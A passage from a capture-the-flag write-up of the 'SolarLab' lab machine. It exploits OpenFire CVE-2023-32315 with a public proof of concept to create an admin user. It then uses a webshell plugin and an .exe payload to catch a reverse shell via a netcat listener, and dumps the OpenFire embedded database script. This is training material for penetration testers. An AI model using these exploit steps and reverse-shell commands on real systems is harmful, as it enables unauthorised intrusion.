2024/05/12 16:14:59 client: Connected (Latency 330.7688ms)
</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780ba815bd5656a710507" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7807c9313ce0981644610" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now the OpenFire console can be accessed at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">localhost:9090</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780d89638f991ed0b8282" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fce61499d-dda9-4141-9422-e17875f2761f%2FUntitled.png?width=638&amp;table=block&amp;id=1700b98a-88f7-80d8-9638-f991ed0b8282"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fce61499d-dda9-4141-9422-e17875f2761f%2FUntitled.png?width=638&amp;table=block&amp;id=1700b98a-88f7-80d8-9638-f991ed0b8282" style="width:638px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780789b16e6dd6d3e5390" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780649fcefde23c00f3d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After Googling its version, I discovered that it’s vulnerable to an RCE exploit.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780d8bd91f4897e86d7fd" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd228ae54-bf43-4577-9d1c-d9d7320e43ed%2Fimage.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-80d8-bd91-f4897e86d7fd"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd228ae54-bf43-4577-9d1c-d9d7320e43ed%2Fimage.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-80d8-bd91-f4897e86d7fd" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780faa724e2a30734cf4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7800895c7f929eced2a59" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">OpenFire Authentication Bypass to RCE (CVE-2023-32315):</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f780a39f9cc8a858d73dea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://nvd.nist.gov/vuln/detail/cve-2023-32315">CVE-2023-32315</a></span><span class="SemanticString"> is a path traversal vulnerability that permitted any unauthenticated users to access restricted pages/functionalities and create new admin users. It’s been wildly exploited with multiple public PoC, including </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/miko550/CVE-2023-32315">this one</a></span><span class="SemanticString"> that I used.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78074911ae0b2404fe14c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1700b98a88f780ffa945f3d2ad71ba8b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> python CVE-2023-32315.py -t http://localhost:9090


 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
                                                                                                       
Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
Use at your own risk!

[..] Checking target: http://localhost:9090
Successfully retrieved JSESSIONID: node01lmx9z5sfykao97k77lzdqot2.node0 + csrf: W7GRdzrC55DBLRu
User added successfully: url: http://localhost:9090 username: sml1ml password: 7vg3yi</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780ddb3fbdc43511ca637" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780b0bcd2defeb32108b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The exploit code created a new admin user, which I can use to log in to the panel.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7801bac15f95841126f18" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F02d8e55f-7008-4d11-9e42-d540358ce00e%2FUntitled.png?width=679.984375&amp;table=block&amp;id=1700b98a-88f7-801b-ac15-f95841126f18"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F02d8e55f-7008-4d11-9e42-d540358ce00e%2FUntitled.png?width=679.984375&amp;table=block&amp;id=1700b98a-88f7-801b-ac15-f95841126f18" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f78061b817ee06f4db1e81" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780ac8492d6c9169bd085" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The admin user has the ability to upload plugins, which can be abused to get code execution. This attack vector was also present on the Jab machine (writeup coming soon). I’ll upload the provided </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.jar</code></span><span class="SemanticString"> plugin file provided in the repository.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78011abe3c239a29cbf99" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fea602f60-a144-42b8-8f7e-0f593dfc8575%2FUntitled.png?width=680&amp;table=block&amp;id=1700b98a-88f7-8011-abe3-c239a29cbf99"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fea602f60-a144-42b8-8f7e-0f593dfc8575%2FUntitled.png?width=680&amp;table=block&amp;id=1700b98a-88f7-8011-abe3-c239a29cbf99" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780df8dfdcb36e64678d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780f6a620f0454f017f9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The webshell can then be accessed under “Server” &gt; “Server Settings” &gt; “Management Tools”. The password is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">123</code></span><span class="SemanticString">, as described in the GitHub page.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7807e937bee7c0650d8aa" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F479a2bb2-7283-4fd9-bae7-d03c58ca8c84%2FUntitled.png?width=679.953125&amp;table=block&amp;id=1700b98a-88f7-807e-937b-ee7c0650d8aa"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F479a2bb2-7283-4fd9-bae7-d03c58ca8c84%2FUntitled.png?width=679.953125&amp;table=block&amp;id=1700b98a-88f7-807e-937b-ee7c0650d8aa" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f7802f9973f202bf3eb003" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f78036924cefefc9fe6f64" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It listed some server information, including the OS version and the current directory.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78063ac72ef4a6dd39d84" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F869cbf8d-8695-4ad1-813e-843c191d2abe%2FUntitled.png?width=680&amp;table=block&amp;id=1700b98a-88f7-8063-ac72-ef4a6dd39d84"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F869cbf8d-8695-4ad1-813e-843c191d2abe%2FUntitled.png?width=680&amp;table=block&amp;id=1700b98a-88f7-8063-ac72-ef4a6dd39d84" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780ffb382fa99a3dce314" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780168e33d73210c9244d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In the dropdown menu, there’s an option “system command” that allows running OS commands.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780b9bc39cd9517fd6ae3" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fdb9a6d00-f798-498c-b78b-a69901b307b3%2FUntitled.png?width=679.984375&amp;table=block&amp;id=1700b98a-88f7-80b9-bc39-cd9517fd6ae3"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fdb9a6d00-f798-498c-b78b-a69901b307b3%2FUntitled.png?width=679.984375&amp;table=block&amp;id=1700b98a-88f7-80b9-bc39-cd9517fd6ae3" style="width:679.984375px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f7802db69ad4abe26bb05e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7807ab66ff056255a7aaa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll start a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netcat</code></span><span class="SemanticString"> listener, and run the same </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.exe</code></span><span class="SemanticString"> payload uploaded when exploiting the PDF library earlier.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780d893b0eb2a1e03d775" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F560c52a0-6068-4025-8406-739342720bf3%2FUntitled.png?width=679.984375&amp;table=block&amp;id=1700b98a-88f7-80d8-93b0-eb2a1e03d775"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F560c52a0-6068-4025-8406-739342720bf3%2FUntitled.png?width=679.984375&amp;table=block&amp;id=1700b98a-88f7-80d8-93b0-eb2a1e03d775" style="width:679.984375px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780f0ad7ffe373c6a99b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780aea353d64d532d4211" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my listener, another shell session was sent back.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f78021a2b3ecd36867304b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.74] from (UNKNOWN) [10.129.213.44] 62565
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Program Files\Openfire\bin&gt;</span></mark></span><span class="SemanticString"><span> whoami

solarlab\openfire</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7804aaf1ac6ff67c8408f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7802abf42c99f958b1ae2" class="Divider"></div><h3 id="https://www.notion.so/1700b98a88f780209f26ed93be3d2c86" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1700b98a88f780209f26ed93be3d2c86"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">solarlab\openfire</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1700b98a88f780eb8ed5c6eec6464957" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Program Files:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f78092b3d6d575a1e01c4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The shell landed me in OpenFire’s program files directory. I noticed there’s an interesting folder called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">embedded-db</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7807cb3b0e6dd291486d3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Program Files\Openfire&gt;</span></mark></span><span class="SemanticString"><span> dir

 Volume in drive C has no label.
 Volume Serial Number is 385E-AC57

 Directory of C:\Program Files\Openfire

11/17/2023  03:22 PM    &lt;DIR&gt;          .
11/17/2023  03:22 PM    &lt;DIR&gt;          ..
11/17/2023  03:11 PM    &lt;DIR&gt;          .install4j
11/17/2023  03:11 PM    &lt;DIR&gt;          bin
11/09/2022  06:59 PM           375,002 changelog.html
05/12/2024  11:33 AM    &lt;DIR&gt;          conf
11/17/2023  03:11 PM    &lt;DIR&gt;          documentation
05/12/2024  11:33 AM    &lt;DIR&gt;          embedded-db
11/17/2023  03:11 PM    &lt;DIR&gt;          lib
02/16/2022  06:55 PM            10,874 LICENSE.html
11/17/2023  03:24 PM    &lt;DIR&gt;          logs
05/12/2024  04:27 PM    &lt;DIR&gt;          plugins
02/16/2022  06:55 PM             5,403 README.html
11/17/2023  03:11 PM    &lt;DIR&gt;          resources
11/09/2022  07:00 PM           798,720 uninstall.exe
               4 File(s)      1,189,999 bytes
              11 Dir(s)   7,730,581,504 bytes free</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7805783c8f0ea5ec2e831" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780bf8dfbdbb0e774cfa9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Inside, there’s some log files and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">openfire.script</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780e99446faf9ffbed345" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Program Files\Openfire\embedded-db&gt;</span></mark></span><span class="SemanticString"><span> dir

 Volume in drive C has no label.
 Volume Serial Number is 385E-AC57

 Directory of C:\Program Files\Openfire\embedded-db

05/12/2024  11:33 AM    &lt;DIR&gt;          .
05/12/2024  11:33 AM    &lt;DIR&gt;          ..
05/12/2024  11:33 AM                 0 openfire.lck
05/12/2024  04:27 PM             1,743 openfire.log
05/12/2024  11:33 AM               106 openfire.properties
05/07/2024  09:53 PM            16,161 openfire.script
05/12/2024  11:33 AM    &lt;DIR&gt;          openfire.tmp
               4 File(s)         18,010 bytes
               3 Dir(s)   7,730,581,504 bytes free</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780938fcecb7294d0b317" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780418e8fd5f4af2883fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">openfire.script</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7802f98eef0580e1b4c2c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">UNIQUE</span> NAME HSQLDB8BDD3B2742
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> GC <span class="token number">0</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">DEFAULT</span> RESULT MEMORY <span class="token keyword">ROWS</span> <span class="token number">0</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> EVENT LOG <span class="token keyword">LEVEL</span> <span class="token number">0</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">TRANSACTION</span> CONTROL LOCKS
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">ISOLATION</span> <span class="token keyword">LEVEL</span> <span class="token keyword">READ</span> <span class="token keyword">COMMITTED</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">TRANSACTION</span> <span class="token keyword">ROLLBACK</span> <span class="token keyword">ON</span> CONFLICT <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">TEXT</span> <span class="token keyword">TABLE</span> DEFAULTS <span class="token string">''</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> NAMES <span class="token boolean">FALSE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> <span class="token keyword">REFERENCES</span> <span class="token boolean">FALSE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> SIZE <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> <span class="token keyword">TYPES</span> <span class="token boolean">FALSE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> TDC <span class="token keyword">DELETE</span> <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> TDC <span class="token keyword">UPDATE</span> <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> CONCAT NULLS <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> <span class="token keyword">UNIQUE</span> NULLS <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> <span class="token keyword">CONVERT</span> <span class="token keyword">TRUNCATE</span> <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> AVG SCALE <span class="token number">0</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">SQL</span> <span class="token keyword">DOUBLE</span> NAN <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> FILES <span class="token keyword">WRITE</span> DELAY <span class="token number">1</span>
<span class="token keyword">SET</span> FILES <span class="token keyword">BACKUP</span> INCREMENT <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> FILES CACHE SIZE <span class="token number">10000</span>
<span class="token keyword">SET</span> FILES CACHE <span class="token keyword">ROWS</span> <span class="token number">50000</span>
<span class="token keyword">SET</span> FILES SCALE <span class="token number">32</span>
<span class="token keyword">SET</span> FILES LOB SCALE <span class="token number">32</span>
<span class="token keyword">SET</span> FILES DEFRAG <span class="token number">0</span>
<span class="token keyword">SET</span> FILES NIO <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> FILES NIO SIZE <span class="token number">256</span>
<span class="token keyword">SET</span> FILES LOG <span class="token boolean">TRUE</span>
<span class="token keyword">SET</span> FILES LOG SIZE <span class="token number">20</span>
<span class="token keyword">CREATE</span> <span class="token keyword">USER</span> SA PASSWORD DIGEST <span class="token string">'d41d8cd98f00b204e9800998ecf8427e'</span>
<span class="token keyword">ALTER</span> <span class="token keyword">USER</span> SA <span class="token keyword">SET</span> <span class="token keyword">LOCAL</span> <span class="token boolean">TRUE</span>
<span class="token keyword">CREATE</span> <span class="token keyword">SCHEMA</span> <span class="token keyword">PUBLIC</span> <span class="token keyword">AUTHORIZATION</span> DBA
<span class="token keyword">SET</span> <span class="token keyword">SCHEMA</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSER<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>STOREDKEY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>SERVERKEY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>SALT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ITERATIONS <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>PLAINPASSWORD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ENCRYPTEDPASSWORD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>EMAIL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CREATIONDATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MODIFICATIONDATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFUSER_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFUSER_CDATE_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSER<span class="token punctuation">(</span>CREATIONDATE<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSERPROP<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PROPVALUE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFUSERPROP_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSERFLAG<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>STARTTIME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ENDTIME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFUSERFLAG_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">,</span>NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
